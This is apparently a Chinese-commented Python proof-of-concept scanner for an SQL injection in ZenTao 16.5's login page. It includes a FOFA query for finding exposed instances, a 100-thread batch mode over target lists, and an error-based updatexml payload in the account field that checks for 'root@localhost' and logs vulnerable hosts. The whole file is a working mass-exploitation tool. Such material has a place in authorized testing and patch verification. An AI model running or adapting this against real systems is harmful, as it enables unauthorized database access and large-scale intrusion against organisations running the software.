#禅道 16.5 router.class.php SQL注入漏洞

#fofa语法：app="易软天创-禅道系统"

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 
                      _             
                     | |            
   ___ __ _ _ __   __| | __ _  ___  
  / __/ _` | '_ \ / _` |/ _` |/ _ \ 
 | (_| (_| | | | | (_| | (_| | (_) |
  \___\__,_|_| |_|\__,_|\__,_|\___/ 
                                                                                                                                                                 
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="禅道 16.5 router.class.php")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/zentao/user-login.html'
    url = target + url_payload
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Referer': 'http://127.0.0.1/zentao/user-login.html',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Length': '188',
        'Origin': 'http://127.0.0.1',
        'Authorization': 'Basic emVudGFvOjh6ajk+N0Y4bkFL',
        'Connection': 'close',
        'Cookie': 'zentaosid=268ccdb7afa650b2307aab5220b0d0c0; lang=zh-cn; device=desktop; theme=default; tab=my; windowWidth=1289; windowHeight=703'
    }
    data =  "account=admin'+and++updatexml(1,concat(0x1,user()),1)+and+'1'='1&password=ea84f41bfdb3c281e176d3bcfbd0107e&passwordStrength=1&referer=%2Fzentao%2F&verifyRand=684624872&keepLogin=0&captcha="
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.post(url=url,headers=header,data=data,verify=False)
        if res.status_code == 200 and "root@localhost" in res.text:
            print(f"f[+]该url存在sql注入漏洞,url为{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else:
            print(f"[-]该url不存在sql注入漏洞,url为{target}")
    except Exception as e:
        print(f"该url出现问题,请手动测试url为{target}")
if __name__ == '__main__':
    main()